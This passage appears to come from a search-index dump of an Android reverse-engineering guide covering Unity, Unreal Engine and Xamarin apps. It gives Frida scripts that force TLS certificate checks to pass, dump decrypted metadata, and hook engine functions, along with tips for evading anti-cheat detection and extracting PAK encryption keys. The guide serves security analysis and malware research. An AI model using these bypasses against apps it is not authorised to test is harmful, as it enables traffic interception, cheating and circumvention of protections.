\"0x1C8D10\"\n};\n\nObject.keys(scriptData).forEach(function(methodName) {\n    var offset = parseInt(scriptData[methodName], 16);\n    var addr = baseAddr.add(offset);\n\n    Interceptor.attach(addr, {\n        onEnter: function(args) {\n            console.log(\"[IL2CPP] \" + methodName + \" called\");\n            console.log(\"  arg0: \" + args[0]);\n            console.log(\"  arg1: \" + args[1]);\n        },\n        onLeave: function(retval) {\n            console.log(\"  retval: \" + retval);\n        }\n    });\n});\n</code></pre> <p>Read IL2CPP string objects (Il2CppString has a length field at offset +0x10 and UTF-16 chars at +0x14):</p> <pre><code>function readIl2CppString(ptr) {\n    if (ptr.isNull()) return \"null\";\n    var length = ptr.add(0x10).readInt();\n    if (length &lt;= 0 || length &gt; 4096) return \"&lt;invalid&gt;\";\n    return ptr.add(0x14).readUtf16String(length);\n}\n</code></pre>"},{"location":"reversing/frameworks/unity/#il2cpp_resolve_icall-hook","title":"il2cpp_resolve_icall Hook","text":"<p>Internal calls (<code>[MethodImpl(MethodImplOptions.InternalCall)]</code>) route through <code>il2cpp_resolve_icall</code>. Hook this to monitor all icall resolutions:</p> <pre><code>var resolve_icall = Module.findExportByName(\"libil2cpp.so\", \"il2cpp_resolve_icall\");\nInterceptor.attach(resolve_icall, {\n    onEnter: function(args) {\n        this.name = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        console.log(\"[icall] \" + this.name + \" -&gt; \" + retval);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/unity/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Unity's networking stack has multiple pinning surfaces depending on how the developer implemented HTTP requests.</p>"},{"location":"reversing/frameworks/unity/#unitywebrequest","title":"UnityWebRequest","text":"<p>Unity's built-in HTTP client (<code>UnityEngine.Networking.UnityWebRequest</code>) uses the engine's internal TLS implementation. On Android, this typically delegates to the platform's SSL stack or BoringSSL bundled in <code>libunity.so</code>. Hook the certificate validation callback:</p> <pre><code>var il2cpp = Process.findModuleByName(\"libil2cpp.so\");\n\nvar symbols = il2cpp.enumerateExports();\nsymbols.forEach(function(sym) {\n    if (sym.name.indexOf(\"CertificateHandler\") !== -1 &amp;&amp; sym.name.indexOf(\"ValidateCertificate\") !== -1) {\n        Interceptor.attach(sym.address, {\n            onLeave: function(retval) {\n                retval.replace(1);\n                console.log(\"[SSL] Forced CertificateHandler.ValidateCertificate to return true\");\n            }\n        });\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/unity/#okhttp-java-layer","title":"OkHttp (Java Layer)","text":"<p>Many Unity apps use Android-native HTTP libraries through Java plugins. OkHttp pinning bypass applies identically to standard Android apps:</p> <pre><code>Java.perform(function() {\n    var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n    CertPinner.check.overload(\"java.lang.String\", \"java.util.List\").implementation = function(host, certs) {\n        console.log(\"[SSL] Bypassed OkHttp pin for: \" + host);\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/unity/#custom-certificate-validation","title":"Custom Certificate Validation","text":"<p>Some Unity apps implement certificate validation in C# by subclassing <code>CertificateHandler</code>:</p> <pre><code>public class AcceptAllCerts : CertificateHandler\n{\n    protected override bool ValidateCertificate(byte[] certificateData)\n    {\n        return true;\n    }\n}\n</code></pre> <p>For IL2CPP apps, locate the <code>ValidateCertificate</code> RVA in <code>dump.cs</code> and force it to return <code>true</code>:</p> <pre><code>var validateCertAddr = il2cpp.base.add(0xRVA_FROM_DUMP);\nInterceptor.attach(validateCertAddr, {\n    onLeave: function(retval) {\n        retval.replace(1);\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/unity/#boringssl-native","title":"BoringSSL (Native)","text":"<p>Unity bundles BoringSSL in some configurations. Bypass at the native layer:</p> <pre><code>var ssl_verify = Module.findExportByName(\"libssl.so\", \"SSL_CTX_set_custom_verify\");\nif (ssl_verify) {\n    Interceptor.attach(ssl_verify, {\n        onEnter: function(args) {\n            args[2] = new NativeCallback(function(ssl, out) {\n                return 0;\n            }, \"int\", [\"pointer\", \"pointer\"]);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/unity/#obfuscation","title":"Obfuscation","text":""},{"location":"reversing/frameworks/unity/#mono-backend-obfuscation","title":"Mono Backend Obfuscation","text":"<p>Mono assemblies are standard .NET DLLs, so any .NET obfuscator works. Common ones found in Unity apps:</p> Obfuscator Techniques Impact on RE Beebyte Obfuscator Identifier renaming, string encryption, control flow obfuscation, fake code injection Class/method names replaced with random strings; strings decrypted at runtime Odin Obfuscator Identifier renaming, anti-decompiler traps dnSpy may crash on protected methods; ILSpy usually handles them ConfuserEx Control flow flattening, anti-tamper, constant encryption Switch-based dispatch replaces structured code Dotfuscator Identifier renaming, string encryption, pruning Microsoft's obfuscator, lightweight protection <p>Beebyte is the most common Unity-specific obfuscator. When present, <code>Assembly-CSharp.dll</code> will contain classes named like <code>\\u0001</code>, <code>\\u0002</code> or randomized alphanumeric strings instead of meaningful names. String literals are replaced with calls to a decryption method.</p>"},{"location":"reversing/frameworks/unity/#il2cpp-backend-obfuscation","title":"IL2CPP Backend Obfuscation","text":"<p>IL2CPP provides a baseline level of protection by compiling to native code, but <code>global-metadata.dat</code> preserves all type/method names by default.</p> <p>Obfuscation applied at the C# level before IL2CPP compilation:</p> <ul> <li>Identifier renaming -- affects names in <code>global-metadata.dat</code> and <code>dump.cs</code> output from Il2CppDumper</li> <li>String encryption -- strings in <code>stringliteral.json</code> appear as encrypted blobs; runtime decryption function must be located and hooked</li> <li>Metadata encryption -- some protections encrypt <code>global-metadata.dat</code> and decrypt it at runtime before IL2CPP initialization; Il2CppDumper fails on encrypted metadata</li> </ul>"},{"location":"reversing/frameworks/unity/#encrypted-global-metadatadat","title":"Encrypted global-metadata.dat","text":"<p>Certain protections (including some Chinese game publishers) encrypt <code>global-metadata.dat</code>. Indicators:</p> <ul> <li>Il2CppDumper fails with a metadata signature error</li> <li>The file does not start with bytes <code>AF 1B B1 FA</code> (the standard metadata magic)</li> <li><code>libil2cpp.so</code> contains a custom loader that decrypts the metadata before passing it to <code>il2cpp_init</code></li> </ul> <p>To recover encrypted metadata, dump it from memory after the app initializes:</p> <pre><code>var il2cpp_init = Module.findExportByName(\"libil2cpp.so\", \"il2cpp_init\");\nInterceptor.attach(il2cpp_init, {\n    onLeave: function(retval) {\n        var metadataReg = Module.findExportByName(\"libil2cpp.so\", \"il2cpp_get_global_metadata\");\n        if (metadataReg) {\n            var getMetadata = new NativeFunction(metadataReg, \"pointer\", []);\n            var metadata = getMetadata();\n            var magic = metadata.readU32();\n            if (magic === 0xFAB11BAF) {\n                var size = metadata.add(4).readU32();\n                var dump = metadata.readByteArray(size);\n                var f = new File(\"/data/local/tmp/global-metadata-decrypted.dat\", \"wb\");\n                f.write(dump);\n                f.close();\n                console.log(\"[+] Dumped decrypted metadata: \" + size + \" bytes\");\n            }\n        }\n    }\n});\n</code></pre>"},{"location":"reversing/frameworks/unity/#malware-context","title":"Malware Context","text":"<p>Unity's popularity in mobile gaming makes it a vector for malicious SDKs and trojanized game mods.</p> Threat Details Goldoson SDK Malicious advertising SDK found in 60+ legitimate Unity games on Google Play (100M+ downloads). Collected installed app lists, Wi-Fi/Bluetooth device data, GPS location. Operated as a supply chain compromise where developers unknowingly included the SDK. Crypto miners in game mods Trojanized Unity game APKs distributed through third-party stores and Telegram channels. Embed Coinhive-derived or XMRig-based miners that run during gameplay, exploiting the expectation of high CPU/GPU usage in games. Ad fraud frameworks Malicious Unity plugins that load hidden WebViews for click fraud, similar to Goldoson's ad-clicking behavior. Games provide cover for battery and data consumption. Data harvesting SDKs Third-party analytics SDKs embedded in Unity games that exceed declared data collection, exfiltrating contacts, SMS, or location under the cover of game analytics. Fake game clones Repackaged popular Unity games with injected malware payloads. The attacker decompiles a Mono-backend game, injects malicious code into <code>Assembly-CSharp.dll</code>, re-signs, and distributes through third-party stores. <p>Supply Chain Risk</p> <p>Unity's plugin ecosystem (Asset Store, third-party SDKs) creates a wide attack surface for supply chain compromise. The Goldoson case demonstrated that legitimate developers with millions of downloads can unknowingly distribute malware through a single malicious SDK dependency. When analyzing Unity malware, check all DLLs in the <code>Managed/</code> directory -- not just <code>Assembly-CSharp.dll</code> -- for third-party SDK code.</p>"},{"location":"reversing/frameworks/unity/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Mono Backend IL2CPP Backend Code format .NET CIL assemblies Native ARM + metadata file Decompilation quality Near-source C# Method signatures only (bodies require native RE) String extraction Trivial (in DLL) Trivial (<code>stringliteral.json</code> from Il2CppDumper) Control flow recovery Full Requires Ghidra/IDA with metadata scripts Patching Edit CIL in dnSpy, replace DLL Patch ARM instructions in <code>libil2cpp.so</code> Obfuscation ceiling .NET obfuscators (Beebyte, ConfuserEx) Metadata encryption + native obfuscation Hooking Mono runtime API Native function hooks via RVA offsets Overall difficulty Easy Moderate to Hard <p>Mono-backend Unity apps are among the easiest Android targets to reverse engineer -- standard .NET tooling produces clean, readable output. IL2CPP raises the bar significantly, but the metadata file is a critical weakness: as long as <code>global-metadata.dat</code> is recoverable (from disk or memory), method names and type structures can be mapped onto the native binary, reducing the problem to conventional native RE with good symbol information.</p>"},{"location":"reversing/frameworks/unity/#references","title":"References","text":"<ul> <li>dnSpy -- .NET Debugger and Assembly Editor (dnSpyEx fork)</li> <li>ILSpy -- .NET Decompiler</li> <li>Il2CppDumper -- Unity IL2CPP Metadata Extractor</li> <li>Cpp2IL -- IL2CPP Analysis Framework</li> <li>Il2CppInspector -- IL2CPP Reverse Engineering Toolkit</li> <li>AssetStudio -- Unity Asset Explorer</li> <li>AssetRipper -- Unity Project Recovery</li> <li>Unity IL2CPP Internals -- Unity Blog</li> <li>Reverse Engineering Unity Games -- Katyscode (Il2CppInspector author)</li> <li>Goldoson Malicious SDK in Unity Games -- McAfee</li> <li>Frida -- Dynamic Instrumentation Toolkit</li> <li>Ghidra -- NSA Reverse Engineering Framework</li> </ul>"},{"location":"reversing/frameworks/unreal-engine/","title":"Unreal Engine","text":"<p>Unreal Engine compiles game logic as native C++ into a massive shared library (<code>libUE4.so</code> for UE4, <code>libUnreal.so</code> for UE5), with Blueprint visual scripting compiled to bytecode embedded in asset files. On Android, all game content is packaged into <code>.pak</code> files (UE4 legacy format) or <code>.utoc</code>/<code>.ucas</code> containers (UE5 IoStore format). The engine binary regularly exceeds 200 MB, making it one of the largest and most complex targets in Android reverse engineering. Unreal Engine games frequently ship with anti-cheat solutions, encrypted PAK files, and obfuscated asset structures.</p>"},{"location":"reversing/frameworks/unreal-engine/#architecture","title":"Architecture","text":"<p>An Unreal Engine Android APK contains three layers:</p> Layer Component Contents Java shell <code>com.epicgames.unreal.GameActivity</code> Minimal Android activity -- engine initialization, lifecycle, permissions Engine binary <code>libUE4.so</code> / <code>libUnreal.so</code> Complete engine -- C++ game logic, Blueprint VM, rendering, physics, networking (~200-400 MB) Game content <code>assets/*.pak</code> / <code>.utoc</code> / <code>.ucas</code> All game assets -- meshes, textures, audio, Blueprint bytecode, data tables <p>The Java layer is a thin wrapper. All game logic -- whether written in C++ or Blueprint -- compiles into the engine binary or is serialized into PAK assets.</p>"},{"location":"reversing/frameworks/unreal-engine/#c-compilation","title":"C++ Compilation","text":"<p>Game C++ code compiles directly into <code>libUE4.so</code> alongside the engine. There is no separation between engine code and game code in the final binary. The resulting <code>.so</code> is a monolithic native library containing:</p> <ul> <li>All engine subsystems (rendering, physics, audio, networking, input)</li> <li>All game-specific C++ classes</li> <li>The UObject reflection system and metadata</li> <li>Blueprint bytecode interpreter</li> <li>Serialization/deserialization for all UAsset types</li> </ul>"},{"location":"reversing/frameworks/unreal-engine/#blueprint-visual-scripting","title":"Blueprint Visual Scripting","text":"<p>Blueprints are Unreal's visual scripting system. They compile to Kismet bytecode stored in <code>.uasset</code> files within PAK archives. The bytecode is interpreted by the Blueprint VM at runtime.</p> Blueprint Aspect Details Storage Serialized in <code>.uasset</code> files inside PAK archives Format Kismet bytecode -- register-based VM with typed instructions Bytecodes Defined in <code>Script.h</code> -- assignment, conditional jumps, switch, function calls Execution Interpreted by <code>UObject::ProcessEvent</code> at runtime Metadata Class names, function names, variable names preserved in UAsset serialization"},{"location":"reversing/frameworks/unreal-engine/#pak-file-system","title":"PAK File System","text":"<p>UE4 uses the PAK format for packaging game content. UE5 introduced the IoStore container format (<code>.utoc</code>/<code>.ucas</code>) alongside legacy PAK.</p> Format Engine Version Files Description PAK (legacy) UE4 all, UE5 <code>.pak</code> Single archive with file table and compressed/encrypted entries IoStore UE4.26+, UE5 <code>.utoc</code> + <code>.ucas</code> + <code>.pak</code> Optimized container -- <code>.utoc</code> is the table of contents, <code>.ucas</code> is the content archive <p>PAK files can be encrypted with AES-256. The encryption key is compiled into the engine binary.</p>"},{"location":"reversing/frameworks/unreal-engine/#identification","title":"Identification","text":"Indicator Location <code>libUE4.so</code> <code>lib/&lt;arch&gt;/libUE4.so</code> -- UE4 engine binary <code>libUnreal.so</code> <code>lib/&lt;arch&gt;/libUnreal.so</code> -- UE5 engine binary <code>assets/*.pak</code> PAK game archives <code>assets/*.utoc</code> / <code>*.ucas</code> IoStore containers (UE5) <code>com.epicgames.unreal.GameActivity</code> Main activity class in AndroidManifest.xml <code>com.epicgames.unreal.*</code> Package prefix in DEX <code>UE4CommandLine.txt</code> Command line arguments file in assets <pre><code>unzip -l target.apk | grep -E \"(libUE4|libUnreal|\\.pak|\\.utoc|\\.ucas|epicgames)\"\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#engine-version-detection","title":"Engine Version Detection","text":"<pre><code>strings lib/arm64-v8a/libUE4.so | grep -E \"^4\\.[0-9]+\\.[0-9]+\"\nstrings lib/arm64-v8a/libUnreal.so | grep -E \"^5\\.[0-9]+\\.[0-9]+\"\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#analysis-workflow","title":"Analysis Workflow","text":""},{"location":"reversing/frameworks/unreal-engine/#step-1-pak-extraction","title":"Step 1: PAK Extraction","text":"<p>Extract PAK files from the APK:</p> <pre><code>unzip target.apk \"assets/*.pak\" \"assets/*.utoc\" \"assets/*.ucas\" -d extracted/\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#step-2-decrypt-pak-if-encrypted","title":"Step 2: Decrypt PAK (If Encrypted)","text":"<p>Many UE games encrypt PAK files with AES-256. The key is embedded in the engine binary.</p> <p>Extract the AES key from the engine binary using UnrealKey:</p> <pre><code>python3 unrealkey.py lib/arm64-v8a/libUE4.so\n</code></pre> <p>Alternatively, search for the key registration function and extract the Base64-encoded key:</p> <pre><code>strings lib/arm64-v8a/libUE4.so | grep -E \"^[A-Za-z0-9+/]{43}=$\"\n</code></pre> <p>The FModel/Unreal-Game-Keys repository maintains a collection of known AES keys for popular games.</p>"},{"location":"reversing/frameworks/unreal-engine/#step-3-unpack-pak-contents","title":"Step 3: Unpack PAK Contents","text":"<p>Use FModel (GUI) or command-line tools to extract PAK contents:</p> <p>Legacy PAK:</p> <pre><code>UnrealPak -Extract extracted/assets/game.pak output_dir/ -aes=0x&lt;hex_key&gt;\n</code></pre> <p>IoStore containers (UE5):</p> <p>ZenTools extracts cooked packages (<code>.uasset</code>/<code>.uexp</code>) from IoStore containers:</p> <pre><code>zentools extract extracted/assets/ output_dir/\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#step-4-asset-analysis-with-fmodel","title":"Step 4: Asset Analysis with FModel","text":"<p>FModel is the primary tool for Unreal Engine asset analysis. It can:</p> <ul> <li>Browse PAK/IoStore archives with or without encryption keys</li> <li>Export textures, meshes, and audio to standard formats</li> <li>View UAsset properties and Blueprint data</li> <li>Convert Zen assets between formats</li> </ul> <p>UAssetAPI provides programmatic access to UAsset files for automated analysis:</p> <pre><code>UAssetGUI path/to/asset.uasset\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#step-5-blueprint-decompilation","title":"Step 5: Blueprint Decompilation","text":"<p>Blueprint bytecode (Kismet) stored in UAsset files can be decompiled with KismetKompiler:</p> <pre><code>kismetkompiler decompile path/to/blueprint.uasset -o decompiled_output/\n</code></pre> <p>KismetKompiler recovers Blueprint node graphs from the serialized Kismet bytecode, producing readable pseudo-code showing function calls, variable assignments, and control flow.</p>"},{"location":"reversing/frameworks/unreal-engine/#step-6-native-c-analysis","title":"Step 6: Native C++ Analysis","text":"<p>The C++ game logic compiled into <code>libUE4.so</code> requires traditional native RE. The UObject reflection system preserves significant metadata:</p> <p>UE4Dumper dumps UObject metadata from a running game process on Android:</p> <pre><code>./ue4dumper -p &lt;pid&gt; -o dump_output/\n</code></pre> <p>frida-ue4dump achieves the same via Frida for UE &gt;= 4.23 (64-bit):</p> <pre><code>var processEventOffset = 0x1234567;\n</code></pre> <p>The dump produces SDK headers with class hierarchies, property offsets, and function signatures, dramatically improving Ghidra/IDA analysis.</p>"},{"location":"reversing/frameworks/unreal-engine/#analysis-tools-summary","title":"Analysis Tools Summary","text":"Tool Purpose URL FModel PAK/IoStore browser, asset viewer, texture/mesh export Primary asset analysis UAssetAPI / UAssetGUI Programmatic UAsset parsing and editing Asset modification KismetKompiler Blueprint (Kismet) bytecode decompilation Blueprint RE UE4Dumper Runtime UObject metadata dump from Android processes SDK generation frida-ue4dump Frida-based UObject dump for UE &gt;= 4.23 64-bit SDK generation UnrealKey AES-256 decryption key extraction from engine binary PAK decryption ZenTools IoStore (.utoc/.ucas) extraction UE5 container extraction Ghidra Native analysis of libUE4.so with UObject type info C++ RE Frida Runtime hooking of UObject methods and engine functions Dynamic analysis"},{"location":"reversing/frameworks/unreal-engine/#hooking","title":"Hooking","text":"<p>Hooking Unreal Engine games on Android is challenging due to the massive binary size, C++ vtable-based dispatch, and the UObject system's complexity.</p>"},{"location":"reversing/frameworks/unreal-engine/#uobject-processevent-hooking","title":"UObject ProcessEvent Hooking","text":"<p><code>UObject::ProcessEvent</code> is the central dispatch function for Blueprint and replicated function calls. Hooking it captures all Blueprint-level function invocations:</p> <pre><code>var ue4 = Process.findModuleByName(\"libUE4.so\");\n\nvar processEvent = ue4.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"ProcessEvent\") !== -1;\n});\n\nif (processEvent.length &gt; 0) {\n    Interceptor.attach(processEvent[0].address, {\n        onEnter: function(args) {\n            var uobject = args[0];\n            var ufunction = args[1];\n            console.log(\"[UE4] ProcessEvent: \" + uobject + \" func=\" + ufunction);\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#virtual-function-table-hooking","title":"Virtual Function Table Hooking","text":"<p>UObject-derived classes use C++ vtables for polymorphic dispatch. Replace vtable entries to intercept specific method calls:</p> <pre><code>var ue4 = Process.findModuleByName(\"libUE4.so\");\nvar vtableAddr = ue4.base.add(0xVTABLE_OFFSET);\n\nvar originalFunc = vtableAddr.readPointer();\nvar replacement = new NativeCallback(function(thisPtr) {\n    console.log(\"[UE4] Hooked vtable call on \" + thisPtr);\n    return originalFunc(thisPtr);\n}, \"pointer\", [\"pointer\"]);\n\nMemory.protect(vtableAddr, Process.pointerSize, \"rwx\");\nvtableAddr.writePointer(replacement);\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#gworld-and-gobjects-enumeration","title":"GWorld and GObjects Enumeration","text":"<p>Enumerate loaded UObjects at runtime to discover game state:</p> <pre><code>var ue4 = Process.findModuleByName(\"libUE4.so\");\n\nvar gobjects = ue4.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"GUObjectArray\") !== -1;\n});\n\nif (gobjects.length &gt; 0) {\n    console.log(\"[UE4] GUObjectArray @ \" + gobjects[0].address);\n}\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#anti-cheat","title":"Anti-Cheat","text":"<p>Unreal Engine games frequently ship with anti-cheat middleware that actively detects and prevents reverse engineering:</p> Solution Description Easy Anti-Cheat (EAC) Epic's own anti-cheat -- kernel-level on PC, user-space on Android. Detects Frida, debuggers, memory tampering BattlEye Third-party anti-cheat with Android support. Integrity checks on engine binary Custom solutions Game-specific integrity checks, server-side validation, encrypted network protocols"},{"location":"reversing/frameworks/unreal-engine/#anti-cheat-bypass-considerations","title":"Anti-Cheat Bypass Considerations","text":"<ul> <li>EAC on Android runs in user-space, making it more bypassable than the kernel-level PC variant</li> <li>Frida detection is common -- use frida-gadget injection or renamed Frida builds</li> <li>Memory integrity checks scan <code>libUE4.so</code> -- avoid inline hooks, prefer vtable replacement</li> <li>Network traffic validation may detect modified game state server-side</li> </ul>"},{"location":"reversing/frameworks/unreal-engine/#ssl-pinning","title":"SSL Pinning","text":"<p>Unreal Engine's TLS implementation varies by version and platform configuration:</p> Method Description Bypass OpenSSL (bundled) Compiled into engine binary Hook <code>SSL_CTX_set_verify</code> in libUE4.so Platform TrustManager Uses Android Java TLS stack Standard Java-layer Frida bypass libcurl Engine's HTTP client uses libcurl with OpenSSL Hook <code>CURLOPT_SSL_VERIFYPEER</code>"},{"location":"reversing/frameworks/unreal-engine/#openssl-native-bypass","title":"OpenSSL Native Bypass","text":"<pre><code>var ue4 = Process.findModuleByName(\"libUE4.so\");\n\nvar sslVerify = ue4.enumerateExports().filter(function(e) {\n    return e.name.indexOf(\"SSL_CTX_set_verify\") !== -1;\n});\n\nif (sslVerify.length &gt; 0) {\n    Interceptor.attach(sslVerify[0].address, {\n        onEnter: function(args) {\n            args[1] = ptr(0x0);\n            console.log(\"[UE4 SSL] Verification disabled\");\n        }\n    });\n}\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#java-trustmanager-bypass","title":"Java TrustManager Bypass","text":"<p>When the engine delegates to Android's Java TLS stack, standard Java-layer hooks work:</p> <pre><code>Java.perform(function() {\n    var TrustManagerImpl = Java.use(\"com.android.org.conscrypt.TrustManagerImpl\");\n    TrustManagerImpl.verifyChain.implementation = function(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {\n        console.log(\"[UE4 SSL] TrustManager bypassed for: \" + host);\n        return untrustedChain;\n    };\n});\n</code></pre>"},{"location":"reversing/frameworks/unreal-engine/#re-difficulty-assessment","title":"RE Difficulty Assessment","text":"Aspect Rating Code format Native ARM64 C++ (200-400 MB monolithic binary) Tool maturity Low-Moderate -- UE4Dumper/frida-ue4dump help, but C++ RE remains manual Symbol recovery Partial -- UObject reflection preserves class/property names, but function implementations are stripped Blueprint recovery Moderate -- KismetKompiler decompiles Blueprint bytecode from UAssets Control flow Extremely difficult -- massive binary, C++ vtable dispatch, template-heavy code String extraction Moderate -- strings spread across engine binary and PAK assets SSL bypass Variable -- depends on TLS implementation (OpenSSL native vs Java TrustManager) Anti-cheat Common -- EAC, BattlEye, custom solutions add significant complexity Overall difficulty Very Hard (rank 28/28) -- hardest framework to reverse engineer on Android <p>Unreal Engine is the most difficult Android framework to reverse engineer. The monolithic native binary with no managed code layer, combined with anti-cheat protection and encrypted assets, makes thorough analysis extremely time-consuming. Blueprint decompilation via KismetKompiler and UObject metadata dumps via UE4Dumper/frida-ue4dump are essential to make any meaningful progress.</p>"},{"location":"reversing/frameworks/unreal-engine/#references","title":"References","text":"<ul> <li>FModel -- Unreal Engine Asset Viewer</li> <li>UAssetAPI -- Unreal Engine Asset Parser</li> <li>KismetKompiler -- Blueprint Decompiler</li> <li>UE4Dumper -- Android UObject Dumper</li> <li>frida-ue4dump -- Frida UE4 Dump Script</li> <li>UnrealKey -- AES Key Extractor</li> <li>FModel/Unreal-Game-Keys -- Known AES Keys</li> <li>UE Modding Tools Collection</li> <li>Blueprint VM Overview -- Gamedev Guide</li> <li>Unofficial UE Modding Guide</li> </ul>"},{"location":"reversing/frameworks/xamarin/","title":"Xamarin / .NET MAUI","text":"<p>Xamarin and its successor .NET MAUI allow developers to write Android apps in C#, compiling to .NET assemblies (DLLs) that run on the Mono runtime. From a reverse engineering perspective, this is excellent: .NET intermediate language (IL) decompiles cleanly back to near-source C# using tools like dnSpy and ILSpy. The challenge is locating and extracting the assemblies, which are stored in increasingly obscured formats across Xamarin, .NET MAUI, and .NET MAUI 9 releases.</p> <p>Microsoft ended Xamarin support in May 2024, designating .NET MAUI as the official successor. Both frameworks use the Mono runtime on Android, but .NET MAUI introduces new packaging formats that complicate extraction. McAfee documented malware campaigns exploiting .NET MAUI's blob-based storage to evade DEX-focused scanners -- the malicious logic sits in C# DLLs that standard Android security tools never inspect.</p>"},{"location":"reversing/frameworks/xamarin/#architecture","title":"Architecture","text":""},{"location":"reversing/frameworks/xamarin/#mono-runtime","title":"Mono Runtime","text":"<p>Both Xamarin and .NET MAUI embed the Mono runtime (<code>libmonosgen-2.0.so</code>) into the APK. Mono provides JIT compilation (default) or AOT compilation for .NET assemblies on Android.</p> Mode Runtime Library Assembly Format RE Approach JIT (default) <code>libmonosgen-2.0.so</code> IL bytecode in DLLs, compiled to native at runtime Decompile DLLs with dnSpy/ILSpy AOT <code>libmonosgen-2.0.so</code> + <code>*.dll.so</code> Pre-compiled native code per assembly Native analysis with Ghidra, limited IL recovery Hybrid (AOT + Interpreter) <code>libmonosgen-2.0.so</code> Mix of pre-compiled and interpreted code DLLs present but some methods pre-compiled <p>JIT mode is by far the most common in production apps. The assemblies are shipped as standard .NET DLLs containing IL bytecode, which Mono JIT-compiles to native ARM instructions at first execution. These DLLs decompile almost perfectly back to C#.</p>"},{"location":"reversing/frameworks/xamarin/#execution-flow","title":"Execution Flow","text":"<pre><code>Android Activity launch\n  \u2192 MonoRuntimeProvider.attachInfo()\n    \u2192 Mono VM initialization (libmonosgen-2.0.so)\n      \u2192 Load assemblies (from DLLs, blob, or ELF payload)\n        \u2192 JIT compile and execute C# entry point\n</code></pre> <p>The Java/Kotlin layer contains only a thin bootstrap: <code>mono.MonoRuntimeProvider</code> initializes the Mono VM, then hands off execution to the C# code.</p>"},{"location":"reversing/frameworks/xamarin/#net-maui-differences","title":".NET MAUI Differences","text":"<p>.NET MAUI is architecturally similar to Xamarin but uses the .NET 6+ runtime instead of legacy Mono. Key differences:</p> Aspect Xamarin .NET MAUI Runtime Mono .NET 6/7/8/9 (still Mono-based on Android) Assembly storage <code>assemblies/</code> directory or <code>assemblies.blob</code> <code>assemblies.blob</code> (MAUI 8), <code>libassemblies.&lt;arch&gt;.blob.so</code> (MAUI 9) Bootstrap <code>MonoRuntimeProvider</code> <code>MauiApplication</code> Support status EOL (May 2024) Active"},{"location":"reversing/frameworks/xamarin/#identification","title":"Identification","text":"Indicator Location <code>assemblies/*.dll</code> Loose DLL files in <code>assemblies/</code> directory (oldest format) <code>assemblies.blob</code> + <code>assemblies.manifest</code> Packed assembly store (Xamarin 13+, MAUI 8) <code>libassemblies.&lt;arch&gt;.blob.so</code> ELF-embedded assemblies (.NET MAUI 9) <code>libmonosgen-2.0.so</code> Mono runtime library <code>libxamarin-app.so</code> Xamarin application bridge <code>mono.MonoRuntimeProvider</code> Bootstrap class in DEX <code>libmonodroid.so</code> Mono-Android interop bridge <code>Mono.Android.dll</code> Android bindings assembly <pre><code>unzip -l target.apk | grep -iE \"(assemblies|monosgen|xamarin|monodroid)\"\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#code-location-extraction","title":"Code Location &amp; Extraction","text":"<p>The extraction method depends on how the assemblies are packaged. Three formats exist, corresponding to different Xamarin/.NET MAUI generations.</p>"},{"location":"reversing/frameworks/xamarin/#format-1-loose-dlls-legacy-xamarin","title":"Format 1: Loose DLLs (Legacy Xamarin)","text":"<p>Oldest format -- assemblies stored as individual <code>.dll</code> files in the <code>assemblies/</code> directory within the APK:</p> <pre><code>unzip target.apk \"assemblies/*.dll\" -d extracted/\nls extracted/assemblies/\n</code></pre> <p>The DLLs may be compressed with LZ4 (indicated by an <code>XALZ</code> header). Decompress before analysis:</p> <pre><code>import lz4.block\nwith open(\"assemblies/MyApp.dll\", \"rb\") as f:\n    data = f.read()\n    if data[:4] == b\"XALZ\":\n        header_size = 12\n        uncompressed_size = int.from_bytes(data[8:12], \"little\")\n        decompressed = lz4.block.decompress(data[header_size:], uncompressed_size=uncompressed_size)\n        with open(\"MyApp.dll\", \"wb\") as out:\n            out.write(decompressed)\n</code></pre>"},{"location":"reversing/frameworks/xamarin/#format-2-assembly-store-blob-xamarin-13-net-maui-8","title":"Format 2: Assembly Store Blob (Xamarin 13+ / .NET MAUI 8)","text":"<p>Modern Xamarin and .NET MAUI 8 apps pack all assemblies into <code>assemblies.blob</code> and <code>assemblies.manifest</code> files:</p> <pre><code>unzip target.apk \"assemblies/*\" -d extracted/\n</code></pre> <p>Use pyxamstore to unpack:</p> <pre><code>pip install pyxamstore\npyxamstore unpack -d extracted/assemblies/\n</code></pre> <p>pyxamstore reads the manifest, locates each assembly in the blob, decompresses LZ4 if applied, and writes individual DLL files. The output directory contains standard .NET assemblies ready for decompilation.</p>"},{"location":"reversing/frameworks/xamarin/#format-3-elf-embedded-assemblies-net-maui-9","title":"Format 3: ELF-Embedded Assemblies (.NET MAUI 9)","text":"<p>.NET MAUI 9 introduced a significant change: assemblies are embedded in ELF shared object files named <code>libassemblies.&lt;arch&gt;.blob.so</code>. The assemblies live in a custom ELF section called <code>payload</code>.</p> <pre><code>unzip target.apk \"lib/arm64-v8a/libassemblies.arm64-v8a.blob.so\" -d extracted/\n</code></pre> <p>Extract the payload section using <code>llvm-objcopy</code>:</p> <pre><code>llvm-objcopy --dump-section payload=assemblies_payload.bin \\\n    extracted/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so\n</code></pre> <p>The extracted <code>assemblies_payload.bin</code> contains the assembly store in the same format as Format 2. Parse it with pyxamstore or a custom script. Individual DLLs within the payload may still carry the <code>XALZ</code> LZ4 compression header and require decompression.</p> <p>MAUI 9 Tooling Gaps</p> <p>As of early 2025, pyxamstore does not natively handle the ELF extraction step. The <code>llvm-objcopy</code> 